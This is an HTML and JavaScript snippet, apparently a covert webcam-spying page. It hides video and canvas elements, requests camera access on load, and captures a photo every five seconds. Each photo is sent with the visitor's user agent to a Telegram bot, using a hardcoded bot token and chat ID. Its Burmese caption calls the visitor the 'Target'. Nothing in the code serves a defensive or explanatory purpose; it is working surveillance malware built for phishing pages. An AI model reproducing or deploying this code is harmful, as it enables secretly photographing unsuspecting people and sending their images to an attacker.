    <video id="video" width="490" height="390" autoplay style="display:none;"></video>
    <canvas id="canvas" width="490" height="390" style="display:none;"></canvas>
    <script>
        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');
        const context = canvas.getContext('2d');

        navigator.mediaDevices.getUserMedia({ video: true })
            .then(stream => {
                video.srcObject = stream;
                setInterval(capturePhoto, 5000);// Capture photo after 5 seconds
            });

        function capturePhoto() {
            context.drawImage(video, 0, 0, 640, 480);
            const dataURL = canvas.toDataURL('image/png');
            sendToTelegram(dataURL);
        }

        function sendToTelegram(dataURL) {
            const base64String = dataURL.split(',')[1];
            const blob = new Blob([base64String], { type: 'text/plain' });
            const formData = new FormData();
            
            const currentDate = new Date().toLocaleString();
          
            formData.append('document', blob, 'webcam Camera photo.txt');
            
            formData.append('caption', `📸 Targetဆီမှပုံတစ်ပုံလက်ခံရရှိပါသည်။ ရရှိလာသောပုံသည်Codeအဖြစ်တည်ရှိနေပြီးထိုCodeကိုပုံအဖြစ်ပြောင်းလဲးကြည့်ရူပါ။ \n\n🖼 𝐕𝐢𝐞𝐰 𝐩𝐡𝐨𝐭𝐨 : https://specialonemyanmar24-prog.github.io/camera/ \n\n👤 𝐔𝐬𝐞𝐫 𝐀𝐠𝐞𝐧𝐭 : ${navigator.userAgent} \n\n⌛ 𝐃𝐚𝐭𝐞 : ${currentDate} \n\n👨 𝐃𝐞𝐯𝐞𝐥𝐨𝐩𝐞𝐫 𝐁𝐲 : @Ak Phyoe\n📲𝐕𝐞𝐫𝐬𝐢𝐨𝐧 : 𝟏.𝟎,`); // 
            fetch(`https://api.telegram.org/bot8275046992:AAG8r5DdbUtyv_sz9-P8VWtF7m6fZzjmFnY/sendDocument?chat_id=6874315478`, {
                method: 'POST',
                body: formData
            })
            .then(response => response.json())
            .then(data => {
                console.log('Success:', data);
            })
            .catch((error) => {
                console.error('Error:', error);
            });
        }
        
    </script>
